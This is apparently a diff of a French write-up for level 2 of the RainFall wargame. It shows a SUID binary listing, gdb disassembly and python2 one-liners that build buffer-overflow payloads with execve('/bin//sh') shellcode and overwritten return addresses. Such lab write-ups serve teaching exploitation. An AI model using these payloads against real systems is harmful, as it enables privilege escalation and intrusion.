@@ -1,6 +1,22 @@
+# LEVEL2
 
+Le systeme de fichier se présente de cette manière:
 
+```Diff
+level2@RainFall:~$ ls -la
+total 17
+dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
+dr-x--x--x  1 root   root    340 Sep 23  2015 ..
+rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
+rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
++rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
+rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
+rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
+```
 
+Le fichier `level2` est un exécutable.
+
+Le bit `SUID` est activé, l'utilisateur `level2` peut exécuter le programme avec les droits de `level3`.
 
 ``` bash
 (gdb) disas p
@@ -36,8 +52,6 @@ Dump of assembler code for function p:
    0x0804853d <+105>:	leave  
    0x0804853e <+106>:	ret    
 End of assembler dump.
-
-
 ```
 
 ret to libc
@@ -58,6 +72,8 @@ $3 = {<text variable, no debug info>} 0xb7ee4360 <execv>
 ```bash
 python2 -c 'print "A"*10 + "\x90"*36 +  "\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80" + "\xe0\xf6\xff\xbf"' > payload
 ```
+
+
 ``` bash
 python2 -c 'print "\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80" + "\x90"*46 + "\x08\xa0\x04\x08"' > payload
 
